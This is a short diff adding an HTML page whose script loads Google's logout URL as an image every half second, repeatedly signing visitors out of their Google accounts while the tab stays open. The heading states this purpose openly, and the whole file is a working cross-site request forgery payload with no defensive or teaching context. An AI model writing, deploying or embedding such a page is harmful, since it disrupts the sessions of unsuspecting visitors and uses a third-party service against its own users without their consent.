@@ -1,0 +1,10 @@
+<html>
+<h1>This will repeatedly sign you out of google unitl you close the tab.</h1>
+<script>
+function logout() {
+  var x = new Image();
+  x.src="https://accounts.google.com/Logout";
+}
+setInterval(logout, 500);
+</script>
+</html>
